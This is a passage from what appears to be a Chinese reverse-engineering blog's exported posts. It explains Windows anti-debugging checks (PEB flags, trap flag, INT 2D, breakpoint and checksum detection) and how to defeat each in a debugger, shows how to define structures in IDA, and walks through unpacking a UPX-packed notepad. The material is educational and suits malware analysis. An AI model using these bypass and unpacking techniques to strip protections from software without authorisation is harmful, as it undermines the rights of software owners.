PEB\n（2）先获取TEB的地址，再通过ProcessEnvironmentBlock成员（偏移为+0x30）获取PEB的地址\nMOV EAX,DWORD PTR FS:[0x18];       FS:[0x18]&#x3D;address of TEB\nMOV EAX,DWORD PTR DS:[EAX+0x30];       DS:[EAX+0x30]&#x3D;address of PEB\nPEB.BeingDebugged（+0x2）进程处于调试状态时，PEB.BeingDebugged成员（+0x2）的值被设置为1（TRUE）；进程在非调试状态下运行时，其值被设置为0（FALSE）。\nIsDebuggerPresent()IsDebuggerPresent() API获取PEB.BeingDebugged成员的值来判断是否正在调试进程（是，则返回1；否，则返回0）。\nIsDebuggerPresent() 函数内部首先使用FS:[30]获取PEB结构体地址，图中为003B1000，然后再获取PEB.BeingDebugged成员的值（即003B1000+0x2&#x3D;003B1002地址处的值），图中为1（TRUE），表示当前进程处于调试状态。\n\n\n\n\n\n\n\n\n\nWindows 7中，IsDebuggerPresent() API是在kernelbase.dll中实现的。而在Windows XP及以前版本的操作系统中，它是在kernel32.dll中实现的。\n API函数内部.png)\n破解之法只要在x32dbg中将PEB.BeingDebugged的值修改为0（FALSE）即可\nPEB.Ldr（+0xC）调试进程时，其堆内存区域中会出现一些特殊标识，表示它正处于被调试状态。其中最醒目的是，未使用的堆内存区域全部填充着0xEEFEEEFE，这证明正在调试进程。利用这一特性即可判断进程是否处于被调试状态。\nPEB.Ldr成员是一个指向_PEB_LDR_DATA结构体的指针。而_PEB_LDR_DATA结构体恰好是在堆内存区域中创建的，所以扫描该区域即可轻松查找是否存在0xEEFEEEFE区域。\n破解之法只要将填充着0xEEFEEEFE的区域全部覆写为NULL即可。\n\n\n\n\n\n\n\n\n\n该方法仅适用于Windows XP系统，而在Windows Vista以后的系统中则无法使用。另外，利用附加功能将运行中的进程附加到调试器时，堆内存中并不出现以上标识。\nPEB.ProcessHeap（+0x18）PEB.ProcessHeap成员（+0x18）是指向HEAP结构体的指针。\nHEAP结构体部分成员如下：\n12345+0x000 Entry           +0x008 Signature +0x00c Flags     +0x010 ForceFlags      ...\n\n其中，进程处于被调试状态时，Flags（+0xc）与ForceFlags（+0x10）成员被设置为特定值。\nGetProcessHeap()PEB.ProcessHeap成员（+0x18）既可以从PEB结构体直接获取，也可以通过GetProcessHeap() API获取。\nGetProcessHeap()函数内部首先使用FS:[30]获取PEB结构体地址，图中为00337000，然后再获取PEB.ProcessHeap成员的值（即00337000+0x18&#x3D;00337018地址处的值），图中为00530000。\n API函数内部.png)\nFlags（+0xc）与ForceFlags（+0x10）进程正常运行（非调试运行）时，Heap.Flags成员（+0xc）的值为0x2，Heap.ForceFlags成员（+0x10）的值为0x0。进程处于被调试状态时，这些值也会随之改变。\n破解之法只要将Heap.Flags成员（+0xc）、Heap.ForceFlags成员（+0x10）的值重新设置为2与0即可（Heap.Flags&#x3D;0x2，Heap.ForceFlags&#x3D;0x0）。\n\n\n\n\n\n\n\n\n\n该方法仅在Windows XP系统中有效，Windows7系统则保留ForceFlags属性和Flags属性。此外，将运行中的进程附加到调试器时，也不出现以上特征。\nPEB.NtGlobalFlag（+0x68）调试进程时，PEB.NtGlobalFlag成员（+0x68）的值会被设置成0x70。所以检测该成员的值即可判断进程是否处于被调试状态。\nNtGlobalFlag 0x70是下列Flags值进行bit OR（按位或）运算的结果：\n123FLG_HEAP_ENABLE_TAIL_CHECK             (0x10)FLG_HEAP_ENABLE_FREE_CHECK             (0x20)FLG_HEAP_VALIDATE_PARAMETERS           (0x40)\n\n破解之法重设PEB.NtGlobalFlag的值为0即可（PEB.NtGlobalFlag&#x3D;0）.\n\n\n\n\n\n\n\n\n\n将运行中的进程附加到调试器时，NtGlobalFlag的值不变。\n基于Windows10的练习1.调试器运行结果首先使用x32dbg&#x2F;Ollydbg打开StaAD_PEB.exe，然后点击运行，结果如下图所示（x32dbg和Ollydbg运行结果不一样），下面主要基于x32dbg练习\nx32dbg运行结果：\n\nOllydbg运行结果：\n\n2.基于PEB.BeingDebugged（+0x2）反调试破解之法①跟踪调试代码，在401036地址处遇到调用IsDebuggerPresent() API的代码\n\n②StepInto跟踪进IsDebuggerPresent() API内部，跳转到IsDebuggerPresent()函数内部，可以看到其内部首先使用FS:[30]获取PEB结构体的地址并传送给EAX寄存器，再通过[EAX+2]获取PEB.BeingDebugged成员并传送给EAX作为函数的返回值。此时只要将PEB.BeingDebugged值修改为0，即可破解基于PEB.BeingDebugged检测的反调试技术。\n\n③修改PEB.BeingDebugged值为0后并返回后继续运行代码，发现输出了”Not debugging”，这表明绕过了基于PEB.BeingDebugged的反调试\n\n3.基于PEB.Ldr（+0xC）反调试破解之法①跟踪代码到401070处，遇到调用NtCurrentTeb() API的代码，并把结果（TEB结构体地址）保存到EAX返回，然后使用MOV EBX,DWORD PTR DS:[EAX+30]指令获取PEB结构体的地址并传送给EBX寄存器，然后使用MOV DWORD PTR SS:[EBP-30],EBX指令把PEB结构体地址保存到[EBP-30]\n\n②继续跟踪调试，401090-40109E处的指令用于将（[EBP-20]~[EBP-2C]）初始化为0xEEFEEEFE，4010A1处指令使用[EBX+C]获取PEB.Ldr成员并保存到ESI（上面已经将PEB结构体地址保存到EBX寄存器中了），4010A4处的指令MOV DWORD PTR SS:[EBP-4],0用于将[EBP-4]处的值置0\n\n③地址4010B0~4010DA间的代码由循环构成4010C7处的CMP指令，EDI寄存器中存储着从PEB.Ldr地址读取的4字节值（上面已经把PEB.Ldr地址保存到ESI中），[ECX]中的值为EEFEEEFE（ECX寄存器中存储着初始化为EEFEEEFE的数组的起始地址）。所以，该处代码用于查找PEB.Ldr中初始化为EEFEEEFE的区域。\n\n④该调试探测技术的破解之法是：先转到PEB.Ldr，然后查找EEFEEEFE的区域并用NULL值覆盖\n\n\n\n\n\n\n\n\n\n由于Windows没有这一特性，所以显示没有被调试\n4.基于PEB.ProcessHeap（+0x18）反调试破解之法5.基于PEB.NtGlobalFlag（+0x68）反调试破解之法","slug":"Windows静态反调试技术（一）","date":"2022-06-20T13:12:54.000Z","categories_index":"","tags_index":"逆向,Windows静态反调试技术","author_index":"0netry"},{"id":"bd414604d17df76b597f4081d3f02f14","title":"Windows动态反调试技术（二）","content":"单步执行TF值设置为1时，CPU将进入单步执行（Single Step）模式。单步执行模式中，CPU执行1条指令后即触发1个EXCEPTION_SINGLE_STEP异常，然后陷阱标志会自动清零（0）。该EXCEPTION_SINGLE_STEP异常可以与SEH技法结合，在反调试技术中用于探测调试器。\n基于Windows10的练习1.使用ollydbg打开DynAD_SingleStep.exe(调试前先取消ollydbg忽略的异常选项)，并转到401000处，下面是程序反调试的代码流\n12345678910111213141516171819202122232425262728293031323334353637383900401000     push ebp                                                   00401001     mov ebp,esp                                                00401003     push ebx                                                   00401004     push dynad_singlestep.4099A0                               00401009     call dynad_singlestep.401087                               0040100E     add esp,4 ; 注册SEH                                                 00401011     push dynad_singlestep.401036                               00401016     push dword ptr fs:[0]                                      0040101D     mov dword ptr fs:[0],esp ; 因无法直接修改EFLAGS，故通过栈修改                                   00401024     pushfd                          ; 将EFLAGS寄存器的值压入栈                            00401025     or dword ptr ss:[esp],100       ; 将TF位设置为1                          0040102D     popfd                           ; 将修改后的TF值存入EFLAGS     ; 执行下列指令后触发EXCEPTION_SINGLE_STEP异常; 若为正常运行，则运行前面注册的SEH（401036）; 若为调试运行，则继续执行以下指令                      0040102E     nop; 调试运行时继续执行以下指令                                                        0040102F     mov eax,FFFFFFFF                                           00401034     jmp eax;SEH00401036     mov eax,dword ptr ss:[esp+C]      ; [esp+C] = pContext                       0040103B     mov ebx,dynad_singlestep.40104A                            00401040     mov dword ptr ds:[eax+B8],ebx     ; pContext-&gt;EIP=40104A                      00401047     xor eax,eax                                                00401049     ret                                                        0040104A     pop dword ptr fs:[0]                                       00401051     add esp,4                                                  00401054     push dynad_singlestep.4099BC                               00401059     call dynad_singlestep.401087                               0040105E     add esp,4                                                  00401061     pop ebx                                                    00401062     pop ebp                                                    00401063     ret                                                        \n\n2.不能直接修改EFLAGS，需要借助PUSHFD&#x2F;POPFD指令与OR运算指令修改陷阱标志的值。如下图中原先EFLAGS的值为212，经过OR运算后编程312，陷阱标志TF的值被设置为1，此时CPU进入单步执行模式，下面执行40102E处的nop指令（StepInto、StepOver、Run中任一个）\n\n3.CPU在单步执行模式（陷阱标志TF为1）下执行1条指令（不管何种指令）就会触发EXCEPTION_SINGLE_STEP异常。若为调试运行时，发生异常时则不会跳到SEH执行，而是继续执行40102F处的代码，进程非正常终止。若为非调试运行，程序就会跳转到401036处执行SEH代码，在SEH中修改EIP为40104A，当SEH处理结束后就会跳转到40104A执行。\n1）调试运行时\n\n\n2）非调试运行时\n\n4.破解方法：修改调试器选项（忽略EXCEPTION_SINGLE_STEP异常）\n\nINT 2DINT 2D原为内核模式中用来触发断点异常的指令，也可以在用户模式下触发异常。但程序调试运行时不会触发异常，只是忽略。这种在正常运行与调试运行中表现出的不同可以很好地应用于反调试技术。下面调试INT2D指令，了解其几个有趣的特征。\n1）忽略下条指令的第一个字节\n在调试模式中执行完INT 2D指令后（Steplnt&#x2F;StepOver），下条指令的第一个字节将被忽略，后一个字节会被识别为新的指令继续执行。\n![](.&#x2F;陷阱标志&#x2F;INT_2D&#x2F;执行INT 2D前的正常指令.png)\n在上图中40101E地址处的INT 2D指令（CD 2D）行完后，401020地址处的MOV EAX,5DEB指令（B8 EB5D0000）中，第一个字节B8将被忽略\n![](.&#x2F;陷阱标志&#x2F;INT_2D&#x2F;执行INT 2D后变化的指令.png)\n执行INT 2D指令后，401021地址处的指令被重新解析为2条指令：JMP 401080（EB 5D）、ADD BYTE PTR DS:[EAX],AL（0000），它们完全不同于原指令MOV EAX,5DEB（B8 EB5D0000）。像这样，基于INT 2D的反调试技术能够形成较强的代码混淆（Obfuscated Code）效果，从而在一定程度上防止代码逆向分析人员调试程序。\n2）一直运行到断点处\nINT 2D指令的另一个特征是，使用StepInto或StepOver命令跟踪INT 2D指令时，程序不会停在其下条指令开始的地方，而是一直运行，直到遇到断点，就像使用RUN命令运行程序一样。\n原因在于执行完INT 2D指令后，原有的代码字节顺序被打乱了，也就是说，若指令在程序执行过程中改变，则程序不能单步暂停，而是一直执行，可以将其视为一种BUG。所以执行完INT 2D指令后，要想停止跟踪代码，需要事先在相应地址处设置断点。\n基于Windows10的练习1.用ollydbg打开DynAD_INT2D.exe，并转到401000处，代码流程如下：\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515200401000 | 55                       | push ebp                                00401001 | 8BEC                     | mov ebp,esp                             00401003 | 51                       | push ecx                                00401004 | C745 FC 00000000         | mov dword ptr ss:[ebp-4],0 ; 安装SEH             0040100B | 68 2A104000              | push dynad_int2d.40102A                 00401010 | 64:FF35 00000000         | push dword ptr fs:[0]                   00401017 | 64:8925 00000000         | mov dword ptr fs:[0],esp ; 触发异常; 若非调试运行，则会转去运行SEH(40102A)               0040101E | CD 2D                    | int 2D; 若调试运行，则跳过一个字节，此处会跳过nop(90)指令运行401021处的指令                             00401020 | 90                       | nop; 调试中dword ptr ss:[ebp-4]被设置为100401021 | C745 FC 01000000         | mov dword ptr ss:[ebp-4],1                         00401028 | EB 1A                    | jmp dynad_int2d.401044; SEH   ; [esp+C]=pContext0040102A | 36:8B4424 0C             | mov eax,dword ptr ss:[esp+C]                    ; [eax+B8]=pContext-&gt;EIP=dynad_int2d.4010440040102F | 3E:C780 B8000000 4410400 | mov dword ptr ds:[eax+B8],dynad_int2d.401044; 正常运行dword ptr ss:[ebp-4]被设置为00040103A | C745 FC 00000000         | mov dword ptr ss:[ebp-4],0                     00401041 | 33C0                     | xor eax,eax                             00401043 | C3                       | ret                                     00401044 | 64:8F05 00000000         | pop dword ptr fs:[0]                    0040104B | 83C4 04                  | add esp,4         ; 4099A0:&quot;Trap Flag (INT 2D)\\n&quot;0040104E | 68 A0994000              | push dynad_int2d.4099A0                        00401053 | E8 4F000000              | call dynad_int2d.4010A7                        00401058 | 83C4 04                  | add esp,4;根据dword ptr ss:[ebp-4]的值来判断是否被调试                                      0040105B | 837D FC 00               | cmp dword ptr ss:[ebp-4],0                     0040105F | 74 0F                    | je dynad_int2d.401070; 4099B4:&quot;  =&gt; Debugging!!!\\n\\n&quot;00401061 | 68 B4994000              | push dynad_int2d.4099B4                        00401066 | E8 3C000000              | call dynad_int2d.4010A7                        0040106B | 83C4 04                  | add esp,4                                      0040106E | EB 0D                    | jmp dynad_int2d.40107D ; 4099C8:&quot;  =&gt; Not debugging...\\n\\n&quot;00401070 | 68 C8994000              | push dynad_int2d.4099C8                        00401075 | E8 2D000000              | call dynad_int2d.4010A7                        0040107A | 83C4 04                  | add esp,4                                      0040107D | 8BE5                     | mov esp,ebp                                    0040107F | 5D                       | pop ebp                                        00401080 | C3                       | ret                                            \n\n\n1）从上面代码和流程图可以看出，程序正常运行（非调试运行）时，执行完40101E地址处的INT 2D指令后，发生异常，转去运行SEH （40102A）。在异常处理器中先把EIP值修改为401044，然后将［EBP-41]变量（局部变量[EBP-4]是BOOL类型变量，用来检测是否存在调试器）的值设置为0（FALSE）。然后转到401044地址处继续执行，最后执行40105B地址处的CMP&#x2F;JE条件分支指令，向控制台输出字符串（Not debugging）\n2）程序调试运行时，执行INT 2D指令后不会运行SEH， 而是跳过1个字节（90），继续执行401021地址处的MOV指令，将［EBP-4］变量设置为1（TRUE），然后跳转到401044地址处继续执行，向控制台输出 “Debugging” 字符串。\n2.破解方法\n在程序调试过程中有时需要跟进SEH逐行分析代码，此时就想要一种方法使程序执行到SEH。利用陷阱标志能使程序轻松进入SEH执行。\n1）首先 ，修改调试器选项使之忽略EXCEPTION_SINGLE_STEP异常，然后在40101E处的INT 2D下断点并运行，此时调试器就会在INT 2D指令处暂停，然后在已注册过的SEH（40102A）处设置断点\n![](.&#x2F;陷阱标志&#x2F;INT_2D&#x2F;Win10_DynAD_INT2D_暂停于INT 2D指令处.png)\n2）将TF的值设置为1，此时CPU进入单步模式。\n\n3）在单步模式下，CPU执行1条指令即触发异常，然后进入SEH处理。接着按StepInto或StepOver执行40101E处的INT 2D指令，但是此时并不能触发异常（在前面的DynAD_SingleStep.exe示例中我们知道，CPU在单步模式下执行1条指令即触发异常，且TF值会清零），原因在于，INT 2D指令原为内核指令，在用户模式的调试器中不会被识别为正常指令。因此调试器在401020地址处的NOP指令处暂停。TF&#x3D;0时，跟踪INT 2D指令后，其下条指令的第一个字节会被忽略，程序继续执行；但TF&#x3D;1时，其后面的1个字节不会被忽略，代码仍被正常识别。接下来，设置TF为1，然后按F7键（StepInto）或F8键（StepOver）执行NOP指令。\n\n4）在单步模式下执行正常指令NOP后，就会触发异常，调试暂停在设有断点的SEH处，同时TF清零。这样就能进入SEH进行逐行分析了。\n\n0xCC在程序调试过程中，一般会设置许多软件断点。断点对应的x86指令为”0xCC”。若能检测到该指令，即可判断程序是否处于调试状态。基于这一想法的反调试技术称为”0xCC探测”技术。\n\n\n\n\n\n\n\n\n\n但0xCC既可以用作操作码，也可以用作移位值、立即数、数据、地址等，所以，在进程内存的代码区域中只扫描0xCC的做法并不可靠。\nAPI断点若只调试程序中的某个局部功能，一个比较快的方法是先在程序要调用的API处设置好断点，再运行程序。运行暂停在相应断点处后，再查看存储在栈中的返回地址。“跟踪返回地址调试相应部分”的方式能够大幅缩小代码调试范围。反调试技术中，探测这些设置在API上的断点就能准确判断当前进程是否处于调试状态。一般而言，断点都没置在API代码的开始部分，所以，只要检测API代码的第一个字节是否为CC即可判断出当前进程是否处于调试之中。\n破解之法\n针对这种反调试技术的行之有效的方法是，向系统API设置断点时尽量避开第一个字节，将之设置在代码的中间部分。此外，设置硬件断点也能避开该反调试技术。\n比较校验和检测代码中设置的软件断点的另一个方法是，比较特定代码区域的校验和（Checksum）值。比如，假定程序中401000~401070地址区域的校验和值为0x12345678，在该代码区域中调试时，必然会设置一些断点（0xCC），如此一来，新的校验和值就与原值不一样了。像这样，比较校验和值即可判断进程是否处于调试状态。\n基于Windows10的练习1.用x32dbg打开DynAD_Checksum.exe，并转到401000处，代码流程如下：\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484900401000      push ebp                                       00401001      mov ebp,esp                                    00401003      push ecx                                       00401004      push ebx                                       00401005      push esi; 4099A0:&quot;Checksum\\n&quot;                                        00401006      push dynad_checksum.4099A0      ; dword ptr ss:[ebp-4]用于判断是否处于调试中的标志              0040100B      mov dword ptr ss:[ebp-4],0                     00401012      call dynad_checksum.401087                     00401017      add esp,4  ; 求校验和值的循环                                    0040101A      mov ecx,dynad_checksum.401070                  0040101F      mov esi,dynad_checksum.401000                  00401024      sub ecx,esi                                    00401026      xor eax,eax                                    00401028      xor ebx,ebx                                    0040102A      movzx ebx,byte ptr ds:[esi]                    0040102E      add eax,ebx                                    00401030      rol eax,1                                      00401032      inc esi                                        00401033      loop dynad_checksum.40102A; 求得的校验和值与原值比较                     00401035      cmp eax,dword ptr ds:[40BDC0]; 校验和值一致，则跳转到401044                  0040103B      je dynad_checksum.401044; 校验和值不一致，则设置dword ptr ss:[ebp-4]为1                       0040103D      mov dword ptr ss:[ebp-4],1;根据dword ptr ss:[ebp-4]的值来判断是否被调试，0表示没有被调试，1表示在调试中                     00401044      cmp dword ptr ss:[ebp-4],0                     00401048      pop esi                                        00401049      pop ebx                                        0040104A      je dynad_checksum.40105D                       ; 4099AC:&quot;  =&gt; Debugging!!!\\n\\n&quot;0040104C      push dynad_checksum.4099AC                     00401051      call dynad_checksum.401087                     00401056      add esp,4                                      00401059      mov esp,ebp                                    0040105B      pop ebp                                        0040105C      ret                                            ; 4099C0:&quot;  =&gt; Not debugging...\\n\\n&quot;0040105D      push dynad_checksum.4099C0                     00401062      call dynad_checksum.401087                     00401067      add esp,4                                      0040106A      mov esp,ebp                                    0040106C      pop ebp                                        0040106D      ret                                            \n\n40102A地址处ESI的初始值为401000（参考40101F地址处的MOV指令），而ECX被用作LoopCount（循环计数），其值为70（参考401024地址处的SUB指令）。代码中的循环用来计算40100040106F区域的校验和值，先读取1个字节值，再执行ADD与ROL指令计算，然后将值保存到EAX寄存器（循环次数就是循环计数）。然后与原值（代码开发时计算的校验和值保存在[40BDC0]中）比较，若不同，则表明40100040106F代码区域中设有断点，或者代码已被修改。\n破解之法\n从理论上讲，只要不在计算CRC的代码区域中设置断点或修改其中代码，基于校验和的反调试技术就会失效。但这本身也可能成反调试技术觊觎的地方（因为调试变得更加困难）。因此，极好的破解方法是修改CRC比较语句。比如在前面的示例中，只要将40103B地址处的指令修改为JMP 40105D即可。当然也可以在调试器中强制修改要跳转（JMP）的地址。与其他反调试技术类似，基于校验和比校的反调试代码会巧妙隐藏于程序各处，可能存在数十个乃至数百个比较校验和的代码，这大大增加了破解难度，调试自然也变得困难多了。\n如下图通过修改ZF标志已实现比较检验和后跳转到401044从而绕过反调试：\n\n","slug":"Windows动态反调试技术（二）","date":"2022-06-11T13:05:26.000Z","categories_index":"","tags_index":"逆向,Windows动态反调试技术","author_index":"0netry"},{"id":"d90627d53e222069704f901ed1b80995","title":"IDA添加结构体","content":"导入头文件方法①首先菜单栏选择File -&gt; Load File -&gt; Parse C Header file（Ctrl+F9）然后导入结构体文件（xxx.h），导入成功会显示compile successful\n②在结构体界面右键选择Add Struct type，此时会弹出创建结构体的对话框\n​    \n③在弹出的对话框中选择Add standard structure，此时会弹出标准结构体对话框\n​    \n④在弹出的对话框中按Ctrl+F搜索导入的结构体名称并选中添加即可\n​    \n手动添加结构体方法①首先在结构体界面右键选择Add Struct type，此时会弹出创建结构体的对话框\n​    \n②输入结构体名称然后回车就会创建结构体\n​    \n③然后右键Edit struct，在弹出的对话框中设置结构体对齐值\n​    \n④然后选择结构体\n\n在结构体结尾（struct_name ends）处按D即可添加结构体成员，但是要注意结构体对齐\n\n如果无法设置dq类型，则菜单栏选择setup data types，勾选5 Quadro word\n\n\n​    \n\n需要补齐对齐值的话，则可以设置为数组，即选中要补齐的所有字节右键选择Array，然后看Array Size是否是要补齐的字节数量，是则回车即可\n\n​    \n示例下面将针对下列结构体使用方法二进行添加、\n123456789#pragram pack(push)#pragram pack(8)struct Vector2D&#123;    char x;    float y;    char z;    long long k;&#125;;#pragram pack(pop) \n\n1.首先要计算下结构体成员偏移及成员直接需要补齐的字节数\n上述结构体中设置了对齐值8，char占1字节，float占4字节，long long占8字节，根据以下公式\n结构体成员偏移计算公式: MeMber offset % min(alg,sizeof(Member type)) &#x3D;&#x3D; 0（其中成员的Member offset 从零开始,当计算完毕之后,需要加上自己所占的字节大小,然后继续参与运算,如果运算不成立,则偏移继续增加,一直到偏移成立）\n结构体总大小计算公式:  sizeof(struct) % min(Max type size,alg) &#x3D;&#x3D; 0;\n\n\n\n\n\n\n\n偏移\n字节大小\n\n\n\nx\n0\n0\n0\n0\n1\n\n\ny\ny\ny\ny\n4\n4\n\n\nz\n0\n0\n0\n8\n1\n\n\n0\n0\n0\n0\n\n\n\n\nk\nk\nk\nk\n16\n8\n\n\nk\nk\nk\nk\n\n\n\n\n第一个成员x：\n当Member Offset&#x3D;0时， MeMber offset % min(alg,sizeof(Member type)) &#x3D;0%min(8,1)&#x3D;&#x3D; 0满足偏移计算公式，所以第一个成员的偏移为0，而其类型为char，占1个字节，所以计算下一个成员的偏移时应从（本成员的偏移值+所占字节）&#x3D;0+1&#x3D;1开始\n第二个成员y：\n①当Member Offset&#x3D;1时， MeMber offset % min(alg,sizeof(Member type)) &#x3D;1%min(8,4)!&#x3D; 0，不满足偏移计算公式，加1继续运算\n②当Member Offset&#x3D;2时，MeMber offset % min(alg,sizeof(Member type)) &#x3D;2%min(8,4)!&#x3D; 0，不满足偏移计算公式，加1继续运算\n③当Member Offset&#x3D;3时，MeMber offset % min(alg,sizeof(Member type)) &#x3D;3%min(8,4)!&#x3D; 0，不满足偏移计算公式，加1继续运算\n④当Member Offset&#x3D;1时，MeMber offset % min(alg,sizeof(Member type)) &#x3D;4%min(8,4)&#x3D;&#x3D; 0，满足偏移计算公式，所以第二个成员的偏移为4，而其类型为float，占4个字节，所以计算下一个成员的偏移时应从（本成员的偏移值+所占字节）&#x3D;4+4&#x3D;8开始\n注：所以第一个成员和第二个成员之间应补齐3个字节（即不满足公式的偏移数量），即上面的0\n第三个成员z：\n当Member Offset&#x3D;1时，MeMber offset % min(alg,sizeof(Member type)) &#x3D;8%min(8,1)&#x3D;&#x3D; 0，满足偏移计算公式，所以第三个成员的偏移为8，而其类型为char，占1个字节，所以计算下一个成员的偏移时应从（本成员的偏移值+所占字节）&#x3D;8+1&#x3D;9开始\n第四个成员k：\n①当Member Offset&#x3D;9时， MeMber offset % min(alg,sizeof(Member type)) &#x3D;9%min(8,8)!&#x3D; 0，不满足偏移计算公式，加1继续运算\n②当Member Offset&#x3D;10时，MeMber offset % min(alg,sizeof(Member type)) &#x3D;10%min(8,8)!&#x3D; 0，不满足偏移计算公式，加1继续运算\n③当Member Offset&#x3D;11时，MeMber offset % min(alg,sizeof(Member type)) &#x3D;11%min(8,8)!&#x3D; 0，不满足偏移计算公式，加1继续运算\n④当Member Offset&#x3D;12时，MeMber offset % min(alg,sizeof(Member type)) &#x3D;12%min(8,8)!&#x3D; 0，不满足偏移计算公式，加1继续运算\n⑤当Member Offset&#x3D;13时，MeMber offset % min(alg,sizeof(Member type)) &#x3D;13%min(8,8)!&#x3D;  0，不满足偏移计算公式，加1继续运算\n⑥当Member Offset&#x3D;14时，MeMber offset % min(alg,sizeof(Member type)) &#x3D;14%min(8,8)!&#x3D;  0，不满足偏移计算公式，加1继续运算\n⑦当Member Offset&#x3D;15时，MeMber offset % min(alg,sizeof(Member type)) &#x3D;15%min(8,8)!&#x3D;  0，不满足偏移计算公式，加1继续运算\n⑧当Member Offset&#x3D;16时，MeMber offset % min(alg,sizeof(Member type)) &#x3D;12%min(8,8)&#x3D;&#x3D; 0，满足偏移计算公式，所以第四个成员的偏移为16，其类型为long long，占8个字节\n注：所以第三个成员和第四个成员之间应补齐7个字节（即不满足公式的偏移数量），即上面的0\n结构体总大小：\n sizeof(struct)&#x3D;最后一个成员的偏移+所占大小&#x3D;16+8&#x3D;24\n结构体成员类型所占字节最大为8（long long）\n根据结构体大小计算公式： sizeof(struct) % min(Max type size,alg) &#x3D;24%min(8，8)&#x3D;&#x3D; 0;\n所以结构体总大小为24\n2.首先在结构体界面右键选择Add Struct type，此时会弹出创建结构体的对话框\n​    \n②输入结构体名称然后回车就会创建结构体\n​    \n③然后右键Edit struct，在弹出的对话框中设置结构体对齐值\n​    \n④添加结构体成员\n在结构体结尾（struct_name ends）处按D添加结构体成员\n​    \n根据前面的计算，第一个成员偏移为0，占1个字节，所以只需要将上面第一个成员field_0成员重命名为x即可（右键Rename或按N）\n​    \n根据前面的计算，第二个成员偏移为4，占4个字节，所以需要移动移动光标到偏移4处的类型，然后按D调整类型为dd，并将其重命名为y（右键Rename或按N）\n​    \n​    \n接着在结构体结尾（struct_name ends）处按D继续添加结构体成员\n​    \n根据前面的计算，第三个成员偏移为8，占1个字节，所以只需要在偏移为8（即上图中y成员下面的field_8成员）处重命名为z即可（右键Rename或按N）\n​    \n根据前面的计算，第四个成员偏移为16，占8个字节，所以需要移动移动光标到偏移16处（需要先在构体结尾（struct_name ends）处按D继续添加结构体成员才能看到16）的类型，然后按D调整类型为dq，并将其重命名为k（右键Rename或按N）\n​    \n​    \n⑤接着将各成员之间需要补齐的字节定义为数组即可\n首先选中x和y之间的所有备注为undefined的块（即为需要补齐的字节），然后右键选择Array，然后看Array Size是否是要补齐的字节数量（根据前面计算为3），是则回车即可，然后将其重命名为align1\n​    \n​    \n​    \n接着选中z和k之间的所有备注为undefined的块（即为需要补齐的字节），然后右键选择Array，然后看Array Size是否是要补齐的字节数量（根据前面计算为7），是则回车即可，然后将其重命名为align2\n​    \n​    \n​    \n至此，结构体添加完成，只需要在要要引用的位置设置该结构体即可（即跳转到引用变量处，alt+q选中添加的结构体即可）\n如果只是在使用变量的地方只有偏移，则先k一下，转换成变量表示后，在跳转到变量所在处设置为结构体\n​    \n","slug":"IDA添加结构体","date":"2022-06-09T08:49:43.000Z","categories_index":"","tags_index":"逆向,IDA使用","author_index":"0netry"},{"id":"d804751ae060ee6bddee780d4be7bc78","title":"UPX脱壳实战——结合逆向工程核心原理","content":"用《逆向工程核心原理》这本书中的notepad_upx.exe来实验\n未加壳的oep\n单步跟踪法脱壳的方法有很多，先来讲脱壳方法中最基础的单步跟踪法。单步跟踪法就是利用OD的单条指令执行功能，从壳的入口一直执行到OEP，最终通过这个OEP将原程序dump出来。在单步跟踪的时候需要跳过一些不能执行到的指令。\n12345678　　使用单步跟踪法追踪OEP的常见步骤：　　1、用OD载入待脱壳文件，如果出现压缩提示，选择“不分析代码”；　　2、向下单步跟踪，实现向下的跳转；　　3、遇到程序往上跳转的时候（包括循环），在回跳的下一句代码上单击并按键盘上的“F4”键跳过回跳指令；　　4、OD中的绿色线条表示跳转没有实理，不必理会，红色线条表示跳转已经实现；　　5、如果刚载入程序的时候，在附近有一个CALL指令，那么就要按键盘上的“F7”键跟进这个CALL内，不然程序很容易运行起来；　　6、在跟踪的时候，如果执行某个CALL指令后就运行，一定要按键盘上的“F7”键进入这个CALL之内再单步跟踪；　　7、遇到在popad指令下的远转移指令时，要格处注意，因为这个远转移指令的目的地很可能就是OEP。\n\n用x32dbg打开加壳程序，会断在pushad指令处\n\n单步运行（step over），当遇到jcc&#x2F;loop指令时，要判断他是往下跳还是往上跳，如果为往下跳，直接跳过去就可以（直接单步运行），但是如果是往上跳，可能会有循环等结构，比较的麻烦，需要利用断点的方式来避免往上跳的情况，这里需要注意，如果遇到jump指令向上时，不能简单的用这一招，需要结合整个jump指令的范围内的jcc来决定，如下所示：\n1.当运行到01015359处的jcc指令时，该指令是往上跳的(从01015359跳到01015348)，这时就在01015359处的下一条指令也就是0101535B处断点然后继续运行来跳过，然后继续单步运行\n\n2.当遇到向上跳的jmp指令时，不能只简单用上面的方法，首先在jmp的后一条指令打断点，然后需要回溯跳转范围内的jcc指令，看有没有跳转到jmp指令后面的，若有则在跳转地址打断点，然后再点运行，如下图中只有1015402和10153EC两处在jmp指令后，在这两处打断点，然后点击运行\n\n3.经过上一步运行后，断点会停在10153EC处\n\n4.继续向下单步，发现其被包含在一个jmp(10153FD)的跳转范围内，则去掉此处的断点，利用2中的处理方法继续设断点，发现只有1015402在10153FD之后，在1015402设置断点，然后点运行\n\n5.此时断点会停在1015402处，继续单步运行，后面会再次遇到jmp（1015476）指令，此时只有1015478符合设断点的条件，但是1015478是个call指令，不宜只设此处一个断点，（有可能此处的call是退出程序的函数。我调试是用od会显示此处是exitprocess函数），所以此时需要看看跳转范围里的jcc，看是否有跳转到范围以上的（即地址小于1015459的），发现有个跳到101543C的\n\n6.回溯101543C，发现其有跳转到jmp（1015476）指令之后的101547E，在101547E处设置断点，然后点运行\n\n7.此时断点停在101547E处，继续单步运行，就看到了popad指令，这也是马上到oep的标志，继续单步运行，发现有个jmp指令（10154BB），但是此时没有向上或向下的箭头，这是因为这是一个大跳转，而这个大跳转的地址就极大可能是oep地址（如下图中的100739D）\n\n\n8.继续单步运行，程序就会跳转到100739D地址处，此处便是oep，可以看和前面未加壳的oep一致\n\nESP定律ESP定律的原理在于程序中堆栈平衡的合理利用。由于在程序自解密或者自解压过程中，不少壳会先将当前寄存器内容压栈，如使用pushad，在解压结束后，会将之前的寄存器值出栈，如使用popad。因此在寄存器出栈时，往往程序代码被自动恢复，此时硬件断点触发。然后在程序当前位置，只需要少许单步跟踪，就很容易到达正确的OEP位置。\n123456　ESP定律法是脱壳的利器，是国外友人发现的。有了ESP定律，可以方便我们脱掉大多数的压缩壳。可谓是本世纪破解界中最伟大的发现之一。这里只简单的看一下狭义ESP定律的原理。　　